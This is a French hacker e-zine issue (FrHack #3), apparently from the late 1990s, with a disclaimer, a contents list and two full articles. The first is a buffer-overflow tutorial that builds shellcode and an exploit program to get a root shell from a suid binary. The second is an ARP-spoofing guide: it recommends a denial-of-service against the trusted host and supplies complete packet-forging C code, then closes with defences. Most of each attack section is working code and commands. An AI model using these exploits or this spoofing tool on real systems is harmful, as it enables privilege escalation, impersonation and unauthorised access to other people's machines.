FRHACK # 3

      _________       ________                                                                   
     (_________))    (________))                                                                      
    (___________)) (_____))  (_))                                                                        
   (_____))____   (_____))__(_))  ___                       ___                                     
  (___________)) (__________))   (___)                     (___)                                         
  (_____))       (_____))  (_))  (___)___  _______  ______ (___)___                                                          
  (_____))       (_____))  (_))  (_______)(_______)(  ____)(_______)                                                      
  (_____))       (_____))  (_))  (___) (_)(___)(__)( (____ (___()__)                                                
  (_____))       (_____))  (_))  (___) (_)(_______)(______)(___) (_)                                                       
                                                           _                              
_____      ___  ___    _____    ______        ____    __ (_)  ____                                  
(   __)    (  _)(_  )  (  _  )  (   ___)      (  _ )  (  )    |__  |                   
) (__  __  )( \/ ) )  ) (_) (   ) (    __     )( (_)  )(      __| |
(   __)(__)(  )  (  ) ( (---) ) (   )  ) _)   (  ) (_)(  )    |__  | 
 ) (__      )(    )(   )(   )(   ) (__( )      )(   ( ))(      __| |                
(_____)    (__)  (__) (__) (__) (_______)     (__)   (___)    |____|                                

Members.xoom.com/frmag                                     Irc: Undernet #hack.fr
Http://come.to/frhack
Et www.frhack.org

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Disclamer
  

L'équipe de FrHack offre à votre disponibilité un Emag. Ce Emag n'a pour but que d'informer, 
donc nous ne sommes nullement responsables des pertes de données informatiques que ces 
informations pourraient occasionnellement causer, bien ou mal utilisées.

Vous introduire sans autorisation dans un autre système informatique, changer de quelques 
manières que ce soit les fichiers que le système contient, est totalement illégal, que vous le 
fassiez consciemment ou non. Bien sûr les textes compris dans ce Emag peuvent vous montrer 
à rentrer sur un ordinateur, mais vous devez vous servir de ces textes que pour vous amusez, et 
combler votre soif de savoir jusqu'au prochain Emag.

Également, aucun des rédacteurs de FrHack ne peut être blâmer des dommages causés, 
accidentellement ou non, à un ordinateur grâce à son article.  

De plus, FrHack s'engage à vous fournir le moins possible d'informations erronées. Si vous 
trouvez une informations erronées dans les textes qui suivent ce disclamer, dites-vous que 
l'erreur est humaine, et veuillez nous faire part de cette information faussée.

Le contenu de ce Emag n'est pas décerné aux personnes suivantes. Personne travaillant pour le 
gouvernement, policier, personne travaillant pour un partie politique ou une agence 
gouvernementale .

En continuant à lire ce Emag, vous agréez entierement à tout ce qui a été énoncé ci-dessus et 
vous vous engagez à ne pas utiliser les informations contenues dans ce Emag de quelque 
maniere que ce soit ou qui pourrait entrer en conflit avec la loi.

L'équipe de FrHack vous souhaite une bonne lecture, et espère que vous apprécierez notre 
Emag.



      L'équipe de FrHack


-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Sommaire


Article                                         Auteur
Buffer Overflow                                 Klog
Spoofing ARP                                    Bubble
ISDN                                            Snowcrach
Hayes et Us Robotic                             Oktober
Exploit Sendmail                                ASHMEU
Fragment de paquet TCP                          Snowcrach
Piratage de Shell                               Khanabyss
RIP                                             oktober
Fonctionnement d'Internet                       Bismuth
TCP/IP                                          Kthulu
Slogan                                          Hack.fr
Iframe                                          Cub1c
Dynamite                                        _Franck
Therme régulier d'internet                      Gabber
Bug démon Imap                                  ASHMEU
Délires sur Internet                            |Pr0teK|
Hack your fac			                  Fedaikin

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Introduction

Dans ce Emag, vous verrez beaucoup d'articles parlant de propos tel les protocoles internet. 
Mais qu’est-ce que ceci viens faire dans un Emag consacrer au hacking? Je vais vous répondre 
par un petit exemple fort simple. Que ferait un mécanicien si il ne savait pas comment 
fonctionne une automobile ? Que ferait un hacker si il ne savait pas comment Internet 
fonctionne?

? Message d'intérêt public

Le message suivant relève de mes convictions, de mes pensées sur l'état actuel d'internet.

Internet, dans sa base, est un outils pédagogique, il permet l'accès en quelques instants à une 
base monumentale de données.  Le problème est que dans tout son évolution, le net est devenu 
une machine à faire de l'argent, plus rien de gratuit, la merde quoi...  C'est pourquoi, aujourd'hui, 
je vous demande quelques petites actions a entreprendre :

- Supportez les projets comme www.eu.org (ils donnent des domain names gratuits) 
 	pour www.ml.org , il est trop tard, ils ont du fermer, faute de support
- Ne cliquez JAMAIS sur des bannières de pub
- Ne souscrivez pas à des bannières de pub, pour faire de l'argent
- Optez pour des services gratuits, shell gratuits par exemple, et logiciels 	gratuit - Read : 
LINUX!
- Ne faites jamais d'échanges commerciaux sur le net, svp! :-) d'ailleurs, vous   êtes bien placés 
pour voir que rien n'est sécure sur internet
- L'informatique doit être utilisé à des fins pédagogique, détruisez le matériel pornographique 
lorsque vous le voyez, pensez qu'il y a de jeunes enfants qui surf aussi.

Voilà, la liste pourrait être longue, mais c'est parce que le net est devenu ainsi qu'il nous faut 
agir...  Je suis à la recherche de personnes voulant partir une campagne contre ce genre de 
choses, un peu comme celle du blue ribbon pour la liberté d'expression. oktober@beer.com

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Buffer Overflow
 
L'exploitation du SUID par l'Homme 
par klog, Promisc Security, Inc.

Dans le but d'expliquer ce qui est, de toute façon, devenu
chose commune chez les script kids.



INTRODUCTION
~~~~~~~~~~~~

Avant de débuter, il serait nécessaire de comprendre en quoi consiste un 
buffer overflow. Étant donner que je m'attends de vous a avoir certaines 
connaissances en C ainsi qu'en assembleur, je ne m'attarderai pas sur ce 
point. Lors de l'appel d'une procedure, le processeur sauvegarde d'abord le 
contenu actuel de %eip dans la stack du programme. Or, la stack ne contient 
pas _seulement_ que ces positions sauvegardes, mais aussi tout buffer alloue 
dynamiquement, ce qui signifie toute variable déclarée a l'intérieur d'une 
procédure, ou toute variable servant d'argument a une procédure. Voici un 
bref exemple de ceci: 


	proc(char *buf2, char *buf1)
	{
		char buf3[10];	
		...			<--- breakpoint
	}

	main()
	{
		char buf0[4];
		...
		proc("pro", "misc"); 
	}
	
	
	STACK: [...             [buf3][%eip][buf2][buf1][buf0]...]


Suivant ce principe, nous serons vite intéressé a overwriter %eip sauvegarde 
dans la stack afin de faire exécuter au processeur notre code arbitraire.  La 
question est _comment_ overwriter l'image d'%eip.  Hors, nous savons qu'en C, 
certaines fonctions peuvent écrire dans un buffer et, si l'on lui ordonne 
d'écrire un string plus grosse que le buffer destination, elle le fera 
au-delà des limites du buffer.  On inclue parmi ces fonctions gets(), 
sprintf(), strcpy(), strcat(), ainsi que des fonctions jugées "plus sécures" 
telles que snprintf() ou bopcy(), si celles-ci sont mal utilisées.  De plus, 
toute fonction de libc (ou toute autre librairie) faisant appel a de telles 
fonctions sont, elles aussi, contamines par la vulnérabilité, par exemple 
certaines vieilles versions de syslog().  Il serait aussi utile de surveiller 
toute assignation faite a des pointeurs, surtout lorsque celles-ci sont 
itératives, ou pire, récursives.  

Pour résumer, l'exploitation d'un buffer overflow consiste en une opération 
d'une grande précision ou l'on tente d'overwriter l'image de %eip sauvegardée 
dans la stack, en tentant d'obliger une function vulnérable a écrire au-delà 
des limites d'un buffer loge dans le stack segment.  Voici donc une 
illustration de chacune des créations de buffer dans la stack de l'exemple 
précedent, ainsi que la string qui servira a overwriter %eip si nous 
considérons que nous la copierons en exploitant, par exemple, strcpy(buf3, 
string):


	  BUF0:                      	   XXXX		
	  BUF1:                        XXXX   			
	  BUF2:                    XXXX    			
	   EIP:           [old_eip]
	  BUF3: XXXXXXXXXX				

	STRING: XXXXXXXXXX[new_eip]



L'EXPLOITATION
~~~~~~~~~~~~~~

Maintenant que nous avons pris connaissance de certains elements 
essentiels, il serait bien de mettre sur pied un plan d'attaque. Ainsi, nous 
savons qu'il est possible d'executer arbitrairement un quelconque code en 
overwritant %eip. La question est maintenant de savoir ou sera positionner ce 
code. En effet, il faut tenir compte du fait que nous sommes dans un 
environnement protéger, ou la virtual memory est utilisée. Cela nous oblige 
donc a include le code a exécuter a l'intérieur même des segments du processus 
vulnérable (qui, étant suid, devient une propriété du root lors de son 
exécution), sans quoi une faute de protection ou de segmentation se produira. 
C'est d'ailleurs pour cette raison que nous placerons notre code a l'intérieur 
même du buffer. Voici une nouvelle représentation de la string de l'overflow:


 	STRING: [NOPs][code arbitraire][new_eip]


Maintenant que nous savons en quoi consiste la string que nous allons 
utiliser, il serait temps de trouver quelques adresses qui nous seront 
nécessaires pour le bon fonctionnement de l'opération:

	1) l'adresse du buffer a overflower;
	2) la position de l'image de %eip.

C'est ici que vous devrez sortir le meilleur ami de l'homme: gdb. 
Supposons d'abord que le programme suivant soit suid root et que nous 
désirions l'exploiter...


	iff% cat > suid.c
	main(int argc, char *argv[]) 
	{ 
		char buffer[1024]; 
		strcpy(buffer, argv[1]); 
	} 
	^C
	iff% gcc -static suid.c -o suid
	iff% gdb suid
	[...]
	(gdb) disassemble main
	Dump of assembler code for function main:
	0x10c0 <main>:  	pushl  %ebp
	0x10c1 <main+1>:        movl   %esp,%ebp
	0x10c3 <main+3>:        subl   $0x400,%esp
	0x10c9 <main+9>:        call   0x1164 <__main>
	0x10ce <main+14>:       movl   0xc(%ebp),%eax
	0x10d1 <main+17>:       addl   $0x4,%eax
	0x10d4 <main+20>:       movl   (%eax),%edx
	0x10d6 <main+22>:       pushl  %edx
	0x10d7 <main+23>:       leal   0xfffffc00(%ebp),%eax
	0x10dd <main+29>:       pushl  %eax
	0x10de <main+30>:       call   0x1238 <strcpy>
	0x10e3 <main+35>:       addl   $0x8,%esp
	0x10e6 <main+38>:       leave
	0x10e7 <main+39>:       ret
	End of assembler dump.


Nous observons ici que l'adresse de "buffer", étant placée dans la stack en 
dernier lieu (puisque "buffer" est le premier argument de strcpy()), sera 
nécessairement contenue dans le registre %eax, tel que le démontre "pushl 
%eax" a l'adresse 0x10dd. Ainsi, nous pourrons récupérer l'adresse de "buffer" 
en récupérant le contenu de %eax juste avant l'appel de strcpy().


	(gdb) break *0x10de
	Breakpoint 1 at 0x10de
	(gdb) run
	Starting program: /usr/home/mbuf/dev/suid

	Breakpoint 1, 0x10de in main ()
	(gdb) info registers
	eax            0xefbfd91c       -272639716
	ecx            0xefbfdd40       -272638656
	edx            0x0      0
	ebx            0xefbfdd3c       -272638660
	esp            0xefbfd914       0xefbfd914
	ebp            0xefbfdd1c       0xefbfdd1c
	esi            0xefbfdd97       -272638569
	edi            0x0      0
	eip            0x10de   0x10de
	eflags         0x286    646
	cs             0x1f     31
	ss             0x27     39
	ds             0x27     39
	es             0x27     39
	(gdb)


Bingo. On s'aperçoit ici que l'adresse de "buffer" est 0xefbfd91c. 
Maintenant, il nous faut trouver l'adresse du contenu de %eip sauvegarde avant 
l'appel de main(). Pour faire une telle chose, la technique la plus sûre est 
sans doute le brute-forcing. Nous tenterons donc d'essayer d'overwriter %eip  
avec exactitude et d'obtenir la distance exacte entre le début du buffer a 
overflower et la position de %eip.


	iff% gdb suid
	[...]
	(gdb) run `perl -e "printf('A'x1032)";echo BBBB`
	Starting program: /usr/home/mbuf/tmp/huhu [...]
  
	Program received signal SIGSEGV, Segmentation fault.
	0x41414141 in ?? ()
	(gdb) bt
	#0  0x41414141 in ?? ()
	(gdb) run `perl -e "printf('A'x1028)";echo BBBB`
	The program being debugged has been started already.
	Start it from the beginning? (y or n) y
	Starting program: /usr/home/mbuf/tmp/huhu [...]

	Program received signal SIGSEGV, Segmentation fault.
	0x42424242 in ?? ()
	(gdb) bt
	#0  0x42424242 in ?? ()
	#1  0x0 in ?? ()
	(gdb)


Bingo. Nous savons maintenant qu'en utilisant un offset de 1028 par rapport 
a la position initiale du buffer (0xefbfd91c), "BBBB" ('B'==0x42) overwrite 
parfaitement %eip. On pouvait s'y attendre, puisque "buffer" n'est séparé de 
l'image de %eip que par l'image de %ebp (registre de 32 bits, 4 bytes), et que 
"buffer" a une taille de 1024 bytes.



LE SHELLCODE
~~~~~~~~~~~~

Maintenant, il est temps de passer aux choses sérieuses. Nous devons écrire le 
shellcode, soit le code que nous exécuterons arbitrairement. Pour ce faire, 
nous allons d'abord écrire le code en C pour ensuite le désassembler...


	iff% cat > code.c
	main()
	{
		char *cmd[] = {"/bin/sh",0};
		execve("/bin/sh", cmd, 0);
	}
	^C
	iff% gcc -static code.c -o code
	iff% ./code
	$ exit
	iff% gdb code
	[...]
	(gdb) disassemble main
	Dump of assembler code for function main:
	0x10c8 <main>:  	pushl  %ebp
	0x10c9 <main+1>:        movl   %esp,%ebp
	0x10cb <main+3>:        subl   $0x8,%esp
	0x10ce <main+6>:        call   0x1174 <__main>
	0x10d3 <main+11>:       leal   0xfffffff8(%ebp),%eax	
	0x10d6 <main+14>:       movl   $0x10c0,0xfffffff8(%ebp)
	0x10dd <main+21>:       movl   $0x0,0xfffffffc(%ebp)
	0x10e4 <main+28>:       pushl  $0x0
	0x10e6 <main+30>:       leal   0xfffffff8(%ebp),%eax
	0x10e9 <main+33>:       pushl  %eax
	0x10ea <main+34>:       pushl  $0x10c0
	0x10ef <main+39>:       call   0x1218 <execve>
	0x10f4 <main+44>:       addl   $0xc,%esp
	0x10f7 <main+47>:       leave
	0x10f8 <main+48>:       ret
	End of assembler dump.
	(gdb) disassemble execve
	Dump of assembler code for function execve:
	0x1218 <execve>:        leal   0x3b,%eax
	0x121e <execve+6>:      lcall  0x7,0x0
	0x1225 <execve+13>:     jb     0x1210 <atexit+112>
	0x1227 <execve+15>:     ret
	(gdb)


On voit ici une grande partie du code que nous désirons inclure dans notre 
shellcode.  Comme vous auriez pu le deviner, de nombreuses modifications 
devront être portées avant que celui-ci ne soit utilisable.  Voici en fait les 
quelques instructions nécessaires au bon fonctionnement du shellcode:


	movl   [shell],0xfffffff8(%ebp)		7 bytes
	movl   $0x0,0xfffffffc(%ebp)	 	7 bytes
	pushl  $0x0				2 bytes
	leal   0xfffffff8(%ebp),%eax		3 bytes
	pushl  %eax				1 byte
	pushl  [shell]				5 bytes
	leal   0x3b,%eax			6 bytes
	lcall  0x7,0x0				7 bytes
	"/bin/sh"


Maintenant que nous avons trouve les instructions a placer dans le shellcode, 
il nous reste a trouver les adresses de "/bin/sh" (shell). Or, si l'on décide 
d'écrire d'abord notre shellcode pour le faire suivre par "/bin/sh", il est 
trivial de calculer la position exacte de "/bin/sh" dans le buffer, étant 
donner que nous connaissons déjà la position du buffer en mémoire. Cependant, 
nous ne désirons pas référer a "/bin/sh" de façon statique dans notre shellcode. 
Pourquoi? tout simplement parce que si on désire placer le shellcode dans un 
autre buffer que celui a overflower, nous devrons aussi _reécrire_ le 
shellcode en entier. C'est pourquoi, lorsque l'on désire faire appel a la 
string "/bin/sh", nous utiliserons une technique simple mais efficace de 
wrapping:


	jmp    [call addr]
	popl   %ebx
        movl   %ebx,0xfffffff8(%ebp)            
        movl   $0x0,0xfffffffc(%ebp)            7 bytes
        pushl  $0x0                             2 bytes
        leal   0xfffffff8(%ebp),%eax            3 bytes
        pushl  %eax                             1 byte
        pushl  %ebx                             
        leal   0x3b,%eax                        6 bytes
        lcall  0x7,0x0                          7 bytes
	call   [popl addr]
	"/bin/sh"


Et voilà. Sachant que les instructions jmp et call peuvent prendre comme 
operands des adresses relatives et que lorsqu'un call est effectuer, 
l'adresse de l'instruction suivante est placée dans la stack (l'image de 
%eip), nous pourrons retrouver l'adresse de "/bin/sh" en la retirant de la 
stack et en la plaçant dans un registre non utilisé (%ebx).

Pour trouver les adresses relatives (offset) de popl et call, nous devrons 
d'abord trouver la taille de chacune des nouvelles instructions que nous avons 
insérés:


	iff% cat > wrapper.c
	main()
	{
        	__asm__("
  	             	        jmp     37
        	                popl    %ebx
				movl    %ebx,0xfffffff8(%ebp)
				pushl   %ebx
       		                call    -36
                	");
	}
	^C
	iff% gdb wrapper
	[...]
	(gdb) disassemble main
	Dump of assembler code for function main:
	0x10c0 <main>:  	pushl  %ebp
	0x10c1 <main+1>:        movl   %esp,%ebp
	0x10c3 <main+3>:        call   0x1154 <__main>
	0x10c8 <main+8>:        jmp    0x10ef <__do_global_dtors+15>
	0x10ca <main+10>:       popl   %ebx
	0x10cb <main+11>:       movl   %ebx,0xfffffff8(%ebp)
	0x10ce <main+14>:       pushl  %ebx
	0x10cf <main+15>:       call   0x10b0 <dlsym+24>
	0x10d4 <main+20>:       leave
	0x10d5 <main+21>:       ret
	(gdb)


Parfait, voici donc avec exactitude le nouveau code que nous désirons avoir 
dans notre shellcode:


        jmp    31				2 bytes
        popl   %ebx				1 byte
        movl   %ebx,0xfffffff8(%ebp)		3 bytes
        movl   $0x0,0xfffffffc(%ebp)            7 bytes
        pushl  $0x0                             2 bytes
        leal   0xfffffff8(%ebp),%eax            3 bytes
        pushl  %eax                             1 byte
        pushl  %ebx				1 byte
        leal   0x3b,%eax                        6 bytes
        lcall  0x7,0x0                          7 bytes
        call   -36				5 bytes
        "/bin/sh"


Voilà! Il est maintenant temps de réécrire notre wrapper, puis de trouver les 
opcodes associées a chacune des instructions que nous désirons utiliser. Pour 
des raisons que je ne connais trop, "lcall" n'a pas des operands valides tel 
que démontré dans l'exemple ci haut. C'est pourquoi nous trouverons les 
opcodes de toutes les instructions en écrivant ces dernières dans un inline 
__asm__, alors que nous trouverons lcall en désassemblant execve():


	iff% cat > asmcode.c
	main()
	{
	        __asm__("
	                        jmp    31
	                        popl   %ebx
	                        movl   %ebx,0xfffffff8(%ebp)
	                        movl   $0x0,0xfffffffc(%ebp)
	                        pushl  $0x0
	                        leal   0xfffffff8(%ebp),%eax
	                        pushl  %eax
	                        pushl  %ebx
	                        leal   0x3b,%eax
	                        call   -31
	        ");
		execve("", 0, 0);
	}
	iff% gcc -static asmcode.c -o asmcode
	iff% gdb asmcode
	[...]
	(gdb) disassemble main
	Dump of assembler code for function main:
	0x10c4 <main>:  	pushl  %ebp
	0x10c5 <main+1>:        movl   %esp,%ebp
	0x10c7 <main+3>:        call   0x1174 <__main>
	0x10cc <main+8>:        jmp    0x10ed <main+41>   # = <main+34>+7
	0x10ce <main+10>:       popl   %ebx
	0x10cf <main+11>:       movl   %ebx,0xfffffff8(%ebp)
	0x10d2 <main+14>:       movl   $0x0,0xfffffffc(%ebp)
	0x10d9 <main+21>:       pushl  $0x0
	0x10db <main+23>:       leal   0xfffffff8(%ebp),%eax
	0x10de <main+26>:       pushl  %eax
	0x10df <main+27>:       pushl  %ebx
	0x10e0 <main+28>:       leal   0x3b,%eax
	0x10e6 <main+34>:       call   0x10c7 <main+3>	  # = <main+10>-7
	0x10eb <main+39>:       pushl  $0x0
	0x10ed <main+41>:       pushl  $0x0
	0x10ef <main+43>:       pushl  $0x10c0
	0x10f4 <main+48>:       call   0x1218 <execve>
	0x10f9 <main+53>:       addl   $0xc,%esp
	0x10fc <main+56>:       leave
	0x10fd <main+57>:       ret
	(gdb) x/31xb 0x10cc
	0x10cc <main+8>:        0xeb    0x1f    0x5b    0x89    0x5d    
	0xf8    0xc7    0x45
	0x10d4 <main+16>:       0xfc    0x00    0x00    0x00    0x00    
	0x6a    0x00    0x8d
	0x10dc <main+24>:       0x45    0xf8    0x50    0x53    0x8d    
	0x05    0x3b    0x00
	0x10e4 <main+32>:       0x00    0x00    0xe8    0xdc    0xff    
	0xff    0xff  	
	(gdb) disassemble execve
	Dump of assembler code for function execve:
	0x1218 <execve>:        leal   0x3b,%eax
	0x121e <execve+6>:      lcall  0x7,0x0
	0x1225 <execve+13>:     jb     0x1210 <atexit+112>
	0x1227 <execve+15>:     ret
	(gdb) x/13xb 0x1218
	0x1218 <execve>:        0x8d    0x05    0x3b    0x00    0x00    
	0x00    0x9a    0x00
	0x1220 <execve+8>:      0x00    0x00    0x00    0x07    0x00
	(gdb)


Et voilà. Voici a quoi va ressembler notre shellcode complet:


        0xeb    0x1f    0x5b    0x89    0x5d
        0xf8    0xc7    0x45
        0xfc    0x00    0x00    0x00    0x00	<--- main
        0x6a    0x00    0x8d
        0x45    0xf8    0x50    0x53    0x8d
        0x05    0x3b    0x00
        0x00    0x00    

        0x8d    0x05    0x3b    0x00    0x00
        0x00    0x9a    0x00			<--- execve
        0x00    0x00    0x00    0x07    0x00

	0xe8    0xdc    0xff			<--- call [popl]
        0xff    0xff

        "/bin/sh"				<--- shell


Hum. On aperçoit un autre problème ici. Le shellcode semble parfait _mais_ il 
ne pourra jamais être copier en entier via une fonction comme strcpy(). 
Pourquoi? tout simplement a cause des 0x00, qui seront considérés comme une 
fin de string. C'est pourquoi deux solutions s'offrent a nous. La première 
serait d'utiliser un registre clear a la place d'utiliser $0x00 dans chaque 
cas nécessaire. La seconde serait d'insérer le shellcode ailleurs que dans le 
buffer cible, ce qui serait la aussi une solution très viable (la placer en 
argv[X] ou autre). 



L'EXPLOIT
~~~~~~~~~

Pour l'exemple d'exploit fournit ici, je ferai abstraction de ce problème pour 
laisser au codeur le choix de sa technique. Cela évitera, de plus, que cet 
article soit utilise aveuglement pour fournir aux script kids une facon simple 
d'écrire leurs propres exploits. Voici donc a quoi ressemblerait un exploit 
pour un buffer overflow cree par une fonction telle bcopy() (ce qui est très 
rare, étant donner la possibilité le limiter la taille des données copiées 
qu'offre bcopy()):


	#define OFFSET	1028

	char shellcode[] = 
		"\xeb\x1f\x5b\x89\x5d\xf8\xc7\x45\xfc\x00\x00"
		"\x00\x00\x6a\x00\x8d\x45\xf8\x50\x53\x8d\x05"
		"\x3b\x00\x00\x00\x8d\x05\x3b\x00\x00\x00\x9a"
		"\x00\x00\x00\x00\x07\x00\xe8\xdc\xff\xff\xff"
        	"/bin/sh";

	main(int argc, char *argv[])
	{
		char string[OFFSET+4];
		int i, j;

		/* copie les NOPs */
                for(i=0;i<(OFFSET-sizeof(shellcode));i++)
                        string[i] = 0x90;

		/* copie le shellcode */
		for(i=i,j=0;i<OFFSET;i++,j++)
			string[i] = shellcode[j];

		/* Buffer Addr = 0xefbfdd1c */
		string[i++] = 0x1c;
		string[i++] = 0xdd;
		string[i++] = 0xbf;
		string[i++] = 0xef;
		
		for(i=0;i<sizeof(string);i++)
			printf("%c", string[i]);
	}



CONCLUSION
~~~~~~~~~~

Comme je l'ai mentionne plus haut (l'ai-je fait?) cet article n'a qu'une 
valeur théorique. En réalité, écrire un buffer overflow est extrêmement plus 
simple, étant donner que de nombreux shellcodes ont déjà été écrits pour de 
nombreuses architectures différentes. De plus, je ne vous assure aucunement 
que l'exploit présenté en exemple marche. Par contre, une chose est sûr, 
c'est qu'il reflète bel et bien le fonctionnement d'un buffer overflow 
typique, tel que décrit tout au long de cet article.

Sur ce, je vous souhaite bonne chance dans votre chasse aux bugs, en 
souhaitant que vous ayez eu le courage de lire l'article en entier. A la 
prochaine...

Collaborateur de FrHack
					klog


-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Spoofing ARP

Le spoofing ARP est un type de spoofing très simple à mettre en oeuvre. Sa puissance vient du 
fait qu'il
permettra d'obtenir une connection TCP active (blind spoofing). Il repose sur la couche 2 du 
modèe OSI (liaison).
Sa faiblesse est qu'il ne peut s'appliquer qu'à des réseaux locaux du fait même du protocole 
ARP. Dans cette article je
vais expliquer comment réaliser un spoof grâce à ARP et aussi les moyen pour lutter contre ce 
type d'attaque.

I/ Quelques notion essentiels
Avant de rentrer dans le vif du sujet il faut comprendre comment fonctionne le protocole ARP. 
ARP veut dire Address
Resolution Protocol. Ce protocole sert à faire la correspondance entre l'adresse IP d'une 
interface et son adresse
physique(MAC). Le dialogue entre deux machine d'un réseaux local ressemble à peu près à ce 
qui est décrit ci-dessous:
  A(123.124.125.126) veut se connecter au serveur B(123.124.125.99)
  A envoie une requete ARP à destination de tous les hôtes du réseau pour obtenir l'adresse 
MAC de B.
    La requete est du type: Est ce que celui qui à telle adresse IP(123.124.125.99) peut 
m'envoyer son adresse MAC ?
  B voit qu'il est directement concerné et il envoi une reponse ARP à A du type: Mon adresse 
MAC est AA:12:CB:35:EF:54

Voila, maintenant vous savez à peu près comment sa marche. Si vous voulez en savoir plus 
achetez la bible d'Internet.

II/ Passons au chose sérieuses
Pour pouvoir réaliser un spoof ARP il faut avoir un accès root. La manipulation est très simple.
 Il faut tout d'abord déterminer quels machines ont une relation de confiance, par exemple
 une machine peut exporter son home directorie à uneautre machine
(showmount -e <IP de la machine>), ou autoriser les connection au moyen des R-
commandes(rusers -al).
Une fois les machines trouvés, on sait pour qui on doit se faire passer.
Exemple: On est sur la machine C et on a découvert que B fait confiance à A, il faut donc se 
faire passer pour A.

Première chose à faire mettre en vrac la machine de confiance(A):
	Il faut lancer une attaque par refus de service, du type flood, syn_flood, land.c,...
	Cette étape n'est pas vraiment nécessaire mais c'est mieux.
Deuxième chose à faire configurer son PC:
	ifconfig eth0 <adresse IP de la machine à spoofer(A)>
Troisièmement il faut désactiver ARP:
	ifconfig -arp	
Quatrièmement il faut envoyer une fausse réponse ARP à la machine à spoofer(B):
	Pour ce faire nous utiliserons un programme donné ci-dessous

Voila, à partir de ce moment B sera convaincu qu'il communique avec A.

Le problème est que les cache ARP s'efface assez rapidement, à peu près toutes les 30 
secondes. Il faudra donc envoyer
une réponse ARP toutes les 25 secondes. On pourra faire ça automatiquement en utilisant les 
crontabs.


/* send_arp.c
This program sends out one ARP packet with source/target IP and Ethernet
hardware addresses suuplied by the user.  It compiles and works on Linux
and will probably work on any Unix that has SOCK_PACKET.The idea behind this program is a 
proof of a concept, 
nothing more.  It comes as is, no warranty.  However, you're allowed to use it under one
condition: you must use your brain simultaneously.  If this condition is not met, you shall forget 
about this 
program and go RTFM immediately. yuri volobuev'97 volobuev@t1.chem.umn.edu */

#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <netdb.h>
#include <sys/socket.h>
#include <linux/in.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#define ETH_HW_ADDR_LEN 6
#define IP_ADDR_LEN 4
#define ARP_FRAME_TYPE 0x0806
#define ETHER_HW_TYPE 1
#define IP_PROTO_TYPE 0x0800
#define OP_ARP_REQUEST 2
#define DEFAULT_DEVICE "eth0"
char usage[]={"send_arp: sends out custom ARP packet. yuri volobuev'97\n\tusage: send_arp 
src_ip_addr 
src_hw_addr targ_ip_addr tar_hw_addr\n\n"};

struct arp_packet {
        u_char targ_hw_addr[ETH_HW_ADDR_LEN];
        u_char src_hw_addr[ETH_HW_ADDR_LEN];
        u_short frame_type;
        u_short hw_type;
        u_short prot_type;
        u_char hw_addr_size;
        u_char prot_addr_size;
        u_short op;
        u_char sndr_hw_addr[ETH_HW_ADDR_LEN];
        u_char sndr_ip_addr[IP_ADDR_LEN];
        u_char rcpt_hw_addr[ETH_HW_ADDR_LEN];
        u_char rcpt_ip_addr[IP_ADDR_LEN];
        u_char padding[18];
};

void die(char *);
void get_ip_addr(struct in_addr*,char*);
void get_hw_addr(char*,char*);

int main(int argc,char** argv)
{
struct in_addr src_in_addr,targ_in_addr;
struct arp_packet pkt;
struct sockaddr sa;
int sock;

if(argc != 5)die(usage);

sock=socket(AF_INET,SOCK_PACKET,htons(ETH_P_RARP));
if(sock<0){
        perror("socket");
        exit(1);
        }

pkt.frame_type = htons(ARP_FRAME_TYPE);
pkt.hw_type = htons(ETHER_HW_TYPE);
pkt.prot_type = htons(IP_PROTO_TYPE);
pkt.hw_addr_size = ETH_HW_ADDR_LEN;
pkt.prot_addr_size = IP_ADDR_LEN;
pkt.op=htons(OP_ARP_REQUEST);

get_hw_addr(pkt.targ_hw_addr,argv[4]);
get_hw_addr(pkt.rcpt_hw_addr,argv[4]);
get_hw_addr(pkt.src_hw_addr,argv[2]);
get_hw_addr(pkt.sndr_hw_addr,argv[2]);

get_ip_addr(&src_in_addr,argv[1]);
get_ip_addr(&targ_in_addr,argv[3]);

memcpy(pkt.sndr_ip_addr,&src_in_addr,IP_ADDR_LEN);
memcpy(pkt.rcpt_ip_addr,&targ_in_addr,IP_ADDR_LEN);

bzero(pkt.padding,18);

strcpy(sa.sa_data,DEFAULT_DEVICE);
if(sendto(sock,&pkt,sizeof(pkt),0,&sa,sizeof(sa)) < 0){
        perror("sendto");
        exit(1);
        }
exit(0);
}

void die(char* str){
fprintf(stderr,"%s\n",str);
exit(1);
}


void get_ip_addr(struct in_addr* in_addr,char* str){

struct hostent *hostp;

in_addr->s_addr=inet_addr(str);
if(in_addr->s_addr == -1){
        if( (hostp = gethostbyname(str)))
                bcopy(hostp->h_addr,in_addr,hostp->h_length);
        else {
                fprintf(stderr,"send_arp: unknown host %s\n",str);
                exit(1);
                }
        }
}

void get_hw_addr(char* buf,char* str){

int i;
char c,val;

for(i=0;i<ETH_HW_ADDR_LEN;i++){
        if( !(c = tolower(*str++))) die("Invalid hardware address");
        if(isdigit(c)) val = c-'0';
        else if(c >= 'a' && c <= 'f') val = c-'a'+10;
        else die("Invalid hardware address");

        *buf = val << 4;
        if( !(c = tolower(*str++))) die("Invalid hardware address");
        if(isdigit(c)) val = c-'0';
        else if(c >= 'a' && c <= 'f') val = c-'a'+10;
        else die("Invalid hardware address");

        *buf++ |= val;

        if(*str == ':')str++;
        }
}


III/ Comment se protéger du spoof ARP
Il existe une méthode très simple pour pouvoir se prémunir du spoofing ARP, il suffit 
d'enregistrer de manière statique
les adresse MAC des cartes réseaux. Une autre méthode pour se prémunir, essentiellement si 
l'on se trouve dans un réseau
hétérogène est d'utiliser le programme ARPWATCH. Cette utilitaire vous informe par email dès 
qu'une adresse IP change
d'adresse MAC. On peut télécharger ARPWATCH à 
http://ftp.su.se/pub/security/tools/audit/arpwatch/arpwatch-1.7.tar.gz

P.S: Il se peut que ca ne marche pas sur tout les ordis. #include <linux/in.h en est la cause, 
si il y as une erreur en compilant, écrivez ceci à la place : // #include  <linux/in.h>

